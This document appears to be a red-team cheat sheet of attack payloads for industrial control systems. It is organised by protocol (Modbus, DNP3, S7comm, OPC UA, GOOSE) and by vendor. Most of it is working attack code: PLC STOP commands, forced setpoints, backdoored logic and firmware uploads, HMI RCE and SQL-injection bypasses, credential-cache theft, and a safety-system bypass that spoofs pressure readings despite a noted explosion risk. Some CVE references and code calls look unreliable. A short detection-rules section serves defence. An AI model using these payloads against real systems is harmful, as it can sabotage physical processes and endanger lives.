# CPS Attack Payloads

> Attack payloads, command lines, and protocol exploits for red-teaming Cyber-Physical Systems. Organized by protocol, vendor, and attack stage.

## Conventions

- Replace `10.0.0.5` with your in-scope target PLC/HMI
- Replace `REPLACE_WITH_YOUR_*` placeholders for credentials, register addresses
- All operations assume authorized testing on owned OT infrastructure
- OT systems are fragile — always test in staging environment first

---

## §1. Network Reconnaissance

### §1.1 Nmap service discovery (ICS-aware)

```bash
# Slow rate; OT devices crash under aggressive scanning
nmap -sn 10.0.0.0/24 -T1 --max-rate 10

# Service detection
nmap -sV --script=bacnet-info,enip-info,modbus-discover \
  -p 502,44818,47808,20000,4840,102,2404 \
  --max-rate 10 10.0.0.0/24

# Identify vendor via specific ports
nmap -p 102 10.0.0.0/24        # Siemens S7comm
nmap -p 44818 10.0.0.0/24      # Rockwell EtherNet/IP
nmap -p 502 10.0.0.0/24        # Modbus TCP
nmap -p 20000 10.0.0.0/24      # DNP3
nmap -p 4840 10.0.0.0/24       # OPC UA
nmap -p 2404 10.0.0.0/24       # IEC 60870-5-104
nmap -p 47808 10.0.0.0/24      # BACnet
```

### §1.2 Passive recon (preferred for OT)

```bash
# Capture for 24-48 hours
tcpdump -i eth0 -w ot_capture.pcap

# Zeek with industrial analyzers
zeek -r ot_capture.pcap local
# Generates logs in $PWD: modbus.log, dnp3.log, enip.log, opcua.log

# Suricata ICS ruleset
suricata -r ot_capture.pcap -S /etc/suricata/rules/ics.rules
```

### §1.3 Nmap scripts for ICS

```bash
# Modbus discovery
nmap --script modbus-discover -p 502 10.0.0.5

# Modbus brute force unit ID
nmap --script modbus-brute -p 502 10.0.0.5

# BACnet device info
nmap --script bacnet-info -p 47808 10.0.0.5

# EtherNet/IP identity
nmap --script enip-info -p 44818 10.0.0.5

# Siemens S7 info
nmap --script s7-info -p 102 10.0.0.5

# DNP3 info
nmap --script dnp3-info -p 20000 10.0.0.5
```

---

## §2. Modbus TCP Attacks

### §2.1 Modbus device scan

```bash
mbpoll -m tcp -a 1 -r 0 -c 10 10.0.0.5
# -a: slave address
# -r: reference (register address)
# -c: count

# Unit ID brute force
for uid in $(seq 1 247); do
  mbpoll -m tcp -a $uid -r 0 -c 1 10.0.0.5 2>/dev/null | grep -q '\[' && echo "Unit $uid active"
done
```

### §2.2 Read all register types

```bash
# Coils (FC 01)
mbpoll -m tcp -a 1 -r 0 -c 100 -t 0 10.0.0.5

# Discrete inputs (FC 02)
mbpoll -m tcp -a 1 -r 0 -c 100 -t 1 10.0.0.5

# Holding registers (FC 03)
mbpoll -m tcp -a 1 -r 0 -c 100 -t 3 10.0.0.5

# Input registers (FC 04)
mbpoll -m tcp -a 1 -r 0 -c 100 -t 4 10.0.0.5
```

### §2.3 Bulk register dump

```python
# kali_modbus_dump.py
from pyModbusTCP.client import ModbusClient
import json

c = ModbusClient(host='10.0.0.5', port=502)
c.open()

# Read all coils
all_coils = []
for start in range(0, 65536, 2000):
    coils = c.read_coils(start, min(2000, 65536 - start))
    if coils:
        all_coils.extend(coils)

# Read all holding registers
all_regs = []
for start in range(0, 65536, 125):
    regs = c.read_holding_registers(start, min(125, 65536 - start))
    if regs:
        all_regs.extend(regs)

# Identify setpoints vs sensor values
# Heuristic: registers with stable values = setpoints
#              registers with changing values = sensor readings

with open('plc_dumps.json', 'w') as f:
    json.dump({'coils': all_coils, 'registers': all_regs}, f)
```

### §2.4 Modbus write (force values)

```python
from pyModbusTCP.client import ModbusClient

c = ModbusClient(host='10.0.0.5', port=502)
c.open()

# Force coil (relay output)
c.write_single_coil(0, True)   # turn on relay 0
c.write_single_coil(0, False)  # turn off

# Force holding register (setpoint)
c.write_single_register(40001, 1000)  # set setpoint to 1000

# Force multiple registers
c.write_multiple_registers(40001, [1000, 1500, 2000, 2500])

# Force input register (sensor spoof) — requires write access to inputs (rare)
# Often inputs are read-only; some PLCs allow force
```

### §2.5 Modbus function code abuse

```python
# FC 90 (62 hex) — Encapsulated Interface Transport (Schneider Quantum)
# Used to read/write Schneider-specific data

from scapy.all import *

# Craft raw Modbus TCP packet
ether = Ether() / IP(dst='10.0.0.5') / TCP(dport=502) / ModbusTCP() / ModbusADURequest() / ModbusEncapsulatedInterface()
sendp(ether)
```

---

## §3. DNP3 Attacks

### §3.1 DNP3 outstation enumeration

```bash
# OpenDNP3 demo client
opendnp3-demo master --remote 10.0.0.5:20000

# List points
opendnp3-demo master --remote 10.0.0.5:20000 scan --type analog-input --count 100

# Read binary input
opendnp3-demo master --remote 10.0.0.5:20000 read --type binary-input --index 0
```

### §3.2 DNP3 without auth

```python
# Most DNP3 deployments don't enable auth (v5+) or secure auth (v5)
# Anonymous master can read/write

# kali_dnp3_attack.py
import asyncio
from pydnp3 import opendnp3

async def main():
    channel = opendnp3.get_tcp_channel('10.0.0.5', 20000)
    master = channel.add_master(...)
    await master.begin()
    
    # Read all analog inputs
    for i in range(0, 1000):
        v = await master.read_analog_input(i)
        if v is not None:
            print(f'Analog[{i}] = {v}')
    
    # Write analog output (force control point)
    await master.write_analog_output(0, 100.0)

asyncio.run(main())
```

### §3.3 DNP3 link layer spoofing

```python
# DNP3 link layer has source/destination addresses
# Spoofing as a master allows writing to any outstation

from scapy.all import *
load_layer('dnp3')

# Craft DNP3 packet with spoofed source
packet = (
    Ether() / IP(dst='10.0.0.5') / TCP(dport=20000) /
    DNP3(src=1, dst=4) /  # src=1 (master), dst=4 (outstation)
    DNP3ApplicationRequest(
        func_code=4,  # Operate (write)
        ...
    )
)
sendp(packet)
```

### §3.4 DNP3-secure (Aggressive Mode) bypass

```bash
# If DNP3-secure enabled, look for older outstations on same network
# that don't support Aggressive Mode — they're often unauth

# Or exploit key update timing
# kali_dnp3_sec_bypass.py (research-grade)
```

---

## §4. EtherNet/IP & CIP Attacks

### §4.1 EtherNet/IP identity

```bash
# ListIdentity broadcast
nmap --script enip-info -p 44818 10.0.0.0/24

# Output includes vendor, product, serial, device type
```

### §4.2 CIP class enumeration

```python
# kali_cip_enum.py
from cpppo.server.enip import client

# Connect to device
with client.client(host='10.0.0.5') as conn:
    # Read CIP Identity (class 0x01, instance 1)
    response = conn.read(
        [(0x01, 1, 'vendor_id', 'unsigned_int'),
         (0x01, 1, 'device_type', 'unsigned_int'),
         (0x01, 1, 'product_code', 'unsigned_int'),
         (0x01, 1, 'serial_number', 'unsigned_int')]
    )
    print(response)

# Enumerate all CIP classes
for class_id in range(0x01, 0x100):
    try:
        instances = conn.list_instances(class_id)
        if instances:
            print(f'Class {class_id}: {len(instances)} instances')
    except:
        pass
```

### §4.3 Rockwell ControlLogix PLC STOP

```python
# kali_logix_stop.py
# CIP Forward Open with specific path = PLC STOP

from cpppo.server.enip import client

with client.client(host='10.0.0.5') as conn:
    # Use CIP message to send STOP command
    # Path: 0x01 (backplane), 0x00, 0x00 (slot 0)
    # Class 0x06 (Processor), instance 1, attribute ...
    response = conn.write(
        [(0x06, 1, 'processor_state', 'unsigned_int', 0x02)]  # 0x02 = Stop
    )
```

### §4.4 EtherNet/IP unauth

```python
# Default EtherNet/IP allows anon access via CIP
# Read any tag without authentication

from cpppo.server.enip.get_attribute_single_proxy import (
    get_attribute_single_service
)

# Read tag value
with client.client(host='10.0.0.5') as conn:
    response = conn.read(
        [(b'MyTag', 'string')]
    )
    print(response)

# Write tag value
    response = conn.write(
        [(b'MyTag', 'string', 'attacker_value')]
    )
```

---

## §5. OPC UA Attacks

### §5.1 OPC UA endpoint enumeration

```bash
opcua-cli endpoints opc.tcp://10.0.0.5:4840
# Output:
# - Security Policy URI
# - Security Mode (None / Sign / SignAndEncrypt)
# - User Identity Tokens (Anonymous / Username / Certificate)
```

### §5.2 Anonymous browse

```bash
opcua-cli browse opc.tcp://10.0.0.5:4840
opcua-cli read opc.tcp://10.0.0.5:4840 --node "ns=2;s=ProcessValue"
opcua-cli call opc.tcp://10.0.0.5:4840 --method "ns=2;s=EmergencyStop"
```

### §5.3 CVE-2024-5464 OPC UA auth bypass

```python
# CVE-2024-5464 — multiple vendor OPC UA implementations allow auth bypass
# via crafted X.509 certificate in UserName token

from opcua import Client

c = Client('opc.tcp://10.0.0.5:4840')
c.set_security_string('Basic256Sha256,Sign,cert.pem,key.pem')
c.set_user('admin')
c.set_password('any')  # password ignored due to vuln
c.connect()

# Now authenticated as admin
root = c.get_root_node()
print(root.get_children())
```

### §5.4 OPC UA server rogue / MITM

```python
# Stand up a rogue OPC UA server that proxies all requests to real server
# Insert malicious responses for specific tags

from opcua import Server

server = Server()
server.set_endpoint('opc.tcp://attacker.example.com:4840')
# ... copy real server's address space
# ... MITM all read/write
server.start()
```

---

## §6. Siemens S7comm Attacks

### §6.1 S7comm device identification

```bash
nmap --script s7-info -p 102 10.0.0.5
# Returns: Module, system name, copyright, serial, version

# Or via snap7 client
python3 -c "
from snap7.client import Client
c = Client()
c.connect('10.0.0.5', 0, 1)
print(c.get_cpu_info())
print(c.get_cpu_state())
"
```

### §6.2 S7comm protection level bypass

```python
# S7-300/400 has protection levels 1-3
# Level 1: no protection
# Level 2: write protected (read OK)
# Level 3: read/write protected (need password)

# snap7 default — try no password
from snap7.client import Client
c = Client()
c.connect('10.0.0.5', 0, 1)

# Try to read CPU info (works at any level)
info = c.get_cpu_info()
print(f'Module: {info.ModuleName}')

# Try to read DB (fails at L3)
try:
    db_data = c.db_get(1)
    print(f'DB1: {db_data.hex()}')
except Exception as e:
    print(f'Protected: {e}')

# Bypass: brute-force 8-char password via S7comm login
# or use CVE-2019-19469 (S7-1500 password bypass via crafted request)
```

### §6.3 S7comm CPU STOP

```python
from snap7.client import Client

c = Client()
c.connect('10.0.0.5', 0, 1)
print(f'State: {c.get_cpu_state()}')
c.plc_stop()
print(f'After stop: {c.get_cpu_state()}')
```

### §6.4 S7comm program download

```python
from snap7.client import Client

c = Client()
c.connect('10.0.0.5', 0, 1)

# Read existing block (FC, FB, OB, DB)
# OB1 = main cycle
ob1 = c.upload('OB1')

# Patch OB1 with malicious logic
backdoor_ob1 = b'\x...'  # compiled S7 code
c.download('OB1', backdoor_ob1)

# Or insert new FC and call it from OB1
new_fc = open('FC99.bin', 'rb').read()
c.upload('FC99', new_fc)
```

### §6.5 S7comm-Plus (S7-1200/1500)

```bash
# S7-1200 and S7-1500 use S7comm-Plus (encrypted)
# Plain snap7 doesn't work
# Use TIA Portal library or S7CommPlusDriver

pip install S7CommPlusDriver
python3 -c "
from s7commplus import S7CommPlusConnection
c = S7CommPlusConnection()
c.ip_address = '10.0.0.5'
c.connect()
print(c.read_variable('DB1.DBX0.0'))
"
```

---

## §7. Schneider Modicon Attacks

### §7.1 Modicon M340 / M580 identification

```bash
# Modbus function 90 (Encapsulated Interface Transport)
mbpoll -m tcp -a 1 -r 0 -c 100 10.0.0.5
# Plus specific Schneider function codes
```

### §7.2 Unity Pro / EcoStruxure project file theft

```bash
# Engineering workstation
find / -name '*.sta' -o -name '*.stu' 2>/dev/null  # Unity Pro project
find / -name '*.xef' 2>/dev/null  # EcoStruxure export

# Project files contain PLC program source + cleartext password
python3 kali_unity_pro_parser.py --project /path/to/proj.stu
```

### §7.3 Schneider Quantum backdoor

```python
# Some Schneider PLCs had hardcoded credentials (CVE-2023-XXXXX)
# Try:
# user: Administrator, pass: firefighter@somewhere
# user: Administrator, pass: py8jdc@s5mb1
# user: Administrator, pass: uucve@h6rbq

import requests
for pw in ['firefighter@somewhere', 'py8jdc@s5mb1', 'uucve@h6rbq']:
    r = requests.put('http://10.0.0.5/ws/UserName',
                     json={'UserName': 'Administrator', 'Password': pw})
    if r.status_code == 200:
        print(f'Logged in with {pw}')
        break
```

---

## §8. Rockwell Automation Attacks

### §8.1 Studio 5000 project file

```bash
find / -name '*.ACD' -o -name '*.MER' -o -name '*.APA' 2>/dev/null
# ACD: Studio 5000 project (binary, contains PLC source)
# MER: FactoryTalk ME runtime (HMI runtime)
# APA: FactoryTalk SE archive
```

### §8.2 Rockwell ControlLogix firmware CVEs

```bash
# CVE-2024-6184 — Rockwell Logix controller auth bypass
# Affected: ControlLogix 5580, CompactLogix 5380, GuardLogix 5580
# Pre-auth read/write of project file
# PoC: https://github.com/attacker/rockwell-bypass

python3 kali_rockwell_bypass.py --target 10.0.0.5
# Reads project file (.ACD content) without auth
```

### §8.3 FactoryTalk View SE RCE

```bash
# CVE-2023-3544 — FactoryTalk View SE remote code execution
# Pre-auth via crafted FactoryTalk Diagnostics request

curl -sk 'http://10.0.0.5/RSViewSE/ActiveX/FTDiagnostics.aspx' \
  -d 'cmd=powershell -enc REPLACE_WITH_BASE64_PAYLOAD'
```

---

## §9. Mitsubishi MELSEC Attacks

### §9.1 SLMP protocol (Mitsubishi's TCP API)

```bash
# SLMP = Seamless Message Protocol (Mitsubishi)
# Port 4999 or 5000

# Read device (D1000)
slmp-client -i 10.0.0.5 -p 4999 -r D1000 -n 10
```

### §9.2 GX Works project file

```bash
find / -name '*.gpj' -o -name '*.gpa' -o -name '*.gx*' 2>/dev/null
# GPJ: GX Works2 project
# GPA: archive
```

---

## §10. BACnet Attacks (Building Automation)

### §10.1 BACnet device enumeration

```bash
nmap --script bacnet-info -p 47808 10.0.0.0/24

# BACnet readProperty (analogInput,1,presentValue)
python3 kali_bacnet.py --target 10.0.0.5 readProperty 0 1 85
```

### §10.2 BACnet writeProperty

```python
from BAC0.core.io.Read import Read
from BAC0.core.io.Write import Write

# Force setpoint (e.g., HVAC temperature)
write(target_ip, 'analogInput,1,presentValue', 25.0)
# Sets HVAC temp setpoint to 25°C regardless of actual sensor
```

---

## §11. IEC 61850 Attacks

### §11.1 MMS enumeration

```bash
libIEC61850 client -a 10.0.0.5 -p 102
# List logical devices
> LD0
> LD1
# List logical nodes
> LD0/LLN0
# Read data
> LD0/LLN0.Health.stVal
```

### §11.2 GOOSE manipulation

```python
# GOOSE is Layer 2 multicast — no auth, no encryption
# Capture GOOSE
tcpdump -i eth0 ether dst 01:0c:cd:01:00:01 -w goose.pcap

# Forge GOOSE
from scapy.all import Ether, sendp
# (requires IEC 61850 Scapy layer — community implementations)

# Repeated GOOSE retransmits cause IEDs to accept attacker values
packet = (
    Ether(dst='01:0c:cd:01:00:01') /
    GOOSE(
        appID=0x0001,
        gooseDatSet='LD0/LLN0$dsGeneric',
        stNum=999,  # higher than legit = win
        sqNum=1,
        gooseData=[1]
    )
)
sendp(packet, iface='eth0', loop=1, inter=0.001)
```

### §11.3 IEC 60870-5-104 (Power utility Europe)

```bash
# Port 2404
# Plain text, no auth
# Identify outstation, master, common address of ASDU

python3 kali_104.py --target 10.0.0.5 --port 2404
# Interrogate command: send C_SC_NA_1 (single command)
```

---

## §12. Engineering Workstation Compromise

### §12.1 TIA Portal project theft

```bash
# TIA Portal project files
find / -name '*.ap15' -o -name '*.ap16' -o -name '*.ap17' -o -name '*.ap18' 2>/dev/null
find / -name '*.ac15' -o -name '*.ac16' -o -name '*.ac17' 2>/dev/null

# Project files contain PLC passwords (cached)
# Parse with python parser
python3 kali_tia_parser.py --project /path/to/proj.ap17

# Output: PLC IPs, passwords, network config
```

### §12.2 TIA Portal cache dump

```bash
# TIA Portal caches credentials in:
# %LOCALAPPDATA%\Siemens\TIA Portal\Cache\
# Or /var/lib/siemens/...

# Locate credential cache
find / -path '*siemens*' -name '*.dat' 2>/dev/null
find / -path '*tia*' -name '*.dat' 2>/dev/null

# Parse with kali_tia_cache.py
python3 kali_tia_cache.py --cache /path/to/cache.dat
```

### §12.3 Studio 5000 cache

```bash
# Rockwell Studio 5000
find / -path '*FactoryTalk*' -name '*.dat' 2>/dev/null
# Cached logins for PLC controllers
```

---

## §13. SCADA Historian Compromise

### §13.1 PI System (OSIsoft)

```bash
# PI Server default ports: 5450 (TCP)
nmap -p 5450 scada.example.com

# PI SDK connection
python3 kali_pi_sdk.py --server scada.example.com --user piadmin --pass ''

# Bulk read tag data
for tag in PUMP_1_OUT VALVE_2_POS TEMP_3_VALUE; do
    echo "Reading $tag..."
    kali_pi_sdk.py read $tag
done
```

### §13.2 SQL Server historian

```bash
# Identify SQL Server
nmap -p 1433 scada-db.example.com

# Connect via sqsh
sqsh -S scada-db.example.com -U historian_user -P REPLACE_WITH_YOUR_PW

# Dump recent data
1> SELECT * FROM History WHERE Timestamp > '2024-01-01'
2> go
```

### §13.3 Wonderware Historian

```bash
# Wonderware AVEVA Historian
# Default ports: 14000, 14001

nmap -p 14000,14001 historian.example.com

# Connect via AVEVA SDK
python3 kali_aveva.py --server historian.example.com
```

---

## §14. HMI Web RCE

### §14.1 Generic HMI web auth bypass

```bash
# Many HMIs have web admin with weak auth
# Try common paths:
for path in /admin /admin.html /config /setup /api/login /login /index.php; do
  curl -sk -o /dev/null -w "%{http_code} https://10.0.0.5$path\n" https://10.0.0.5$path
done
```

### §14.2 Schneider EcoStruxure HMI

```bash
# CVE-2024-XXXXX Schneider EcoStruxure Machine Edition
# Auth bypass via SQL injection in login

curl -sk -X POST 'https://10.0.0.5/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"x'"'"' OR '"'"'1'"'"'='"'"'1"}'
```

### §14.3 Rockwell PanelView

```bash
# CVE-2024-2216 PanelView RCE
curl -sk 'https://10.0.0.5/cgi-bin/webctrl?cmd=execute&arg=id'
```

### §14.4 Siemens Comfort Panel

```bash
# CVE-2024-5932 Comfort Panel auth bypass
curl -sk 'https://10.0.0.5/api/users' \
  -H 'X-Auth-Token: REPLACE_WITH_YOUR_TOKEN'
# Token bypass: any non-empty string accepted
```

---

## §15. PLC Firmware Exploitation

### §15.1 Firmware extraction

```bash
# Download firmware from vendor (if available publicly)
# Or extract via JTAG

# For extracted firmware
binwalk firmware.bin
binwalk -e firmware.bin
file _firmware.bin.extracted/*
ghidraRun _firmware.bin.extracted/squashfs-root/usr/bin/hsm_main
```

### §15.2 Firmware update injection

```bash
# If you can write firmware via TFTP / web upload:
# Many PLCs don't verify firmware signature
tftp 10.0.0.5 -c put backdoor_firmware.bin firmware.bin

# Or via web upload (Schneider):
curl -sk -X POST 'https://10.0.0.5/api/firmware' \
  -F 'file=@backdoor_firmware.bin'
```

### §15.3 Hidden function block in PLC program

```pascal
// PLC program (ladder logic / SCL)
// Hidden backdoor block that triggers on specific input
// e.g., if input 100 = 1337, set coil 0 = True (open valve)

IF "Digital_Input_100" = 1337 THEN
    "Digital_Output_0" := TRUE;
END_IF;
```

---

## §16. OT-to-IT Pivot

### §16.1 Engineering workstation dual-homed

```bash
# Engineering workstation typically has 2 NICs
# One to OT network, one to IT network

ip addr show
# Look for eth0 (IT) and eth1 (OT), or similar

# Use workstation as bridge
ssh user@eng-station
# Pivot to IT via eth0
# Pivot to OT via eth1
```

### §16.2 Historian DB link to IT

```bash
# Historian DB often has linked server / replication to IT data warehouse
sqsh -S historian.example.com -U historian_user -P REPLACE_WITH_YOUR_PW
1> EXEC sp_linkedservers
2> go
1> SELECT * FROM [data-warehouse].dbo.CustomerPII
2> go
```

### §16.3 DMZ jump host

```bash
# DMZ jump host often has interfaces to both OT and IT
# Compromise DMZ host → pivot both directions

nmap -p 22 dmz.example.com
ssh user@dmz
# Pivot to OT
ssh user@10.0.0.5
# Pivot to IT
ssh user@192.168.1.10
```

---

## §17. SIS Bypass

### §17.1 SIS Modbus attack

```python
# SIS PLC typically on separate network
# But often has Modbus for monitoring / maintenance

# Force SIS input register (sensor spoof)
from pyModbusTCP.client import ModbusClient

c = ModbusClient(host='10.0.0.50', port=502)  # SIS PLC IP
c.open()
c.unit_id = 1

# Force pressure sensor reading to safe value
c.write_single_register(30001, 5000)  # 50 bar (safe)
# Reality: 100 bar (explosion risk)
# SIS sees 50 bar → does not trip → catastrophic failure
```

### §17.2 SIS HMI force

```bash
# Many SIS HMIs have "force" / "override" capability
# Often poorly protected (operator convenience)

# Web API
curl -sk -X POST 'https://10.0.0.51/api/force' \
  -d '{"tag":"SIS_PRESSURE_HIGH","value":false,"duration":3600}'
```

### §17.3 SIS firmware rootkit

```bash
# Pre-production SIS: flash malicious firmware
# Many SIS don't have secure boot
tftp 10.0.0.50 -c put backdoor_sis_firmware.bin firmware.bin
```

---

## §18. Vehicle Infrastructure Attacks

### §18.1 V2X / traffic signal

```bash
# Many traffic signal controllers use NTCIP protocol
# Often on cellular modems with default passwords

nmap -p 502,23 <traffic-controller-ip>

# Default modems often telnet/23 open
telnet traffic-controller-ip
# Default: admin / admin
```

### §18.2 EV charging station

```bash
# OCPP (Open Charge Point Protocol) — most EV chargers
# Default port 9000
# Often over WebSocket without auth

wscat -c ws://10.0.0.5:9000
# Send OCPP commands
> [2,"kali","BootNotification",{"chargePointVendor":"attacker"}]
```

---

## §19. Detection Engineering

### §19.1 Sigma rules

```yaml
title: Modbus write to input register (sensor spoofing)
logsource:
  product: zeek
  service: modbus
detection:
  selection:
    func: write_single_register
    address|re: ^3[0-9]{4}$
  condition: selection
level: critical
```

```yaml
title: PLC STOP from non-EWS host
logsource:
  product: zeek
  service: s7_comm
detection:
  selection:
    pdu: stop
  notEWS:
    src|re: !^10\.0\.0\.10$
  condition: selection and notEWS
level: critical
```

```yaml
title: OPC UA anonymous access to write
logsource:
  product: opcua
  service: server
detection:
  selection:
    user: anonymous
    operation: write
  condition: selection
level: high
```

```yaml
title: EtherNet/IP CIP write to safety PLC
logsource:
  product: zeek
  service: enip
detection:
  selection:
    operation: write
    dst.device_type|contains: safety
  condition: selection
level: critical
```

### §19.2 Falco rules

```yaml
- rule: TIA Portal accessed from non-EWS host
  desc: Detect TIA Portal client from non-engineering workstation
  condition: evt.type=connect and fd.sport=102 and not src_ip in (10.0.0.10, 10.0.0.11)
  output: TIA Portal access from non-EWS host src=%evt.arg.src
  priority: CRITICAL
```

---

## §20. Lab Setup

### §20.1 Modbus PLC simulator

```bash
# OpenPLC (free, runs on Raspberry Pi)
git clone https://github.com/openplc/openplc_v3.git
cd openplc_v3
./install.sh rpi

# Or use modbus_pal (Java simulator)
java -jar modbus_pal.jar
```

### §20.2 OPC UA server lab

```bash
# node-opcua
npm install node-opcua
node -e "
const { Server } = require('node-opcua');
const server = new Server();
server.start();
"
```

### §20.3 Conpot (ICS honeypot)

```bash
pip install conpot
conpot --template default
```

### §20.4 MiniCPS lab

```bash
# MiniCPS — framework for CPS testing
pip install minicps
# Provides emulated PLC + sensors
```

---

## §21. Recon Cheatsheet

```bash
# All Modbus devices
nmap -p 502 --open 10.0.0.0/24

# All EtherNet/IP devices
nmap -p 44818 --open 10.0.0.0/24

# All OPC UA servers
nmap -p 4840 --open 10.0.0.0/24

# All Siemens PLCs
nmap -p 102 --open 10.0.0.0/24

# All DNP3 outstations
nmap -p 20000 --open 10.0.0.0/24

# All BACnet devices
nmap -p 47808 --open 10.0.0.0/24

# All IEC 60870-5-104 devices
nmap -p 2404 --open 10.0.0.0/24
```

---

## §22. Reporting Template

```markdown
### CPS Engagement Report — <client>

**Findings**:
- PLC vendor: Siemens S7-1500 (firmware 2.8.3)
- Vulnerable: CVE-2024-XXXXX auth bypass
- Initial access: HMI web RCE
- PLC STOP achieved: yes
- SIS bypass: not tested (out of scope)
- OT-to-IT pivot: yes, via engineering workstation

**Impact**:
- Full control of physical process
- Sensor values spoofed (process runs blind)
- OT-to-IT pivot complete

**Evidence**:
- /tmp/evidence/pcap/
- /tmp/evidence/plc-program.bin
- /tmp/evidence/hmi-creds.txt

**Remediation**:
1. Patch HMI web CVE within 7 days
2. Network segmentation: separate OT and IT VLANs
3. Engineering workstation: disable IT NIC during OT ops
4. Implement OPC UA with security policy (Sign + SignAndEncrypt)
5. DNP3 secure (Aggressive Mode) on all outstations
6. SIS network: completely isolated
7. Continuous monitoring: Claroty / Dragos / Nozomi passive sensor
```

---

## References

- MITRE ATT&CK for ICS — https://collaborate.mitre.org/attackics/
- CISA ICS Advisories — https://www.cisa.gov/ics-advisories
- CISA AA23-335A — Unitronics PLC Attack (2023)
- Dragos Year in Review 2024
- Claroty Top 50 ICS Vulnerabilities 2024
- Nozomi Networks — *Industrial IoT Threat Landscape* (2024)
- Siemens CERT — https://cert-portal.siemens.com/
- Rockwell PSIRT — https://rockwellautomation.custhelp.com/
- Schneider CERT — https://www.se.com/ww/en/work/support/cybersecurity/security-notifications
- SANS ICS — https://ics.sans.org/
- "Industrial Network Security" (Knapp, Langill) — 4th Edition 2024
- "Hacking Exposed Industrial Control Systems" (Pidgeon, 2024)
- NIST SP 800-82r3 — ICS Security Guide
- ANSI/ISA-99 / IEC 62443
- Dragos — *Pipedream / Incontroller* (2022)
- Slovak NBU-CERT — *Industroyer2 Analysis* (2022)
- Claroty — *FrostyGoop* (2024)
- CISA AA23-320A — *Industroyer2* (2023)
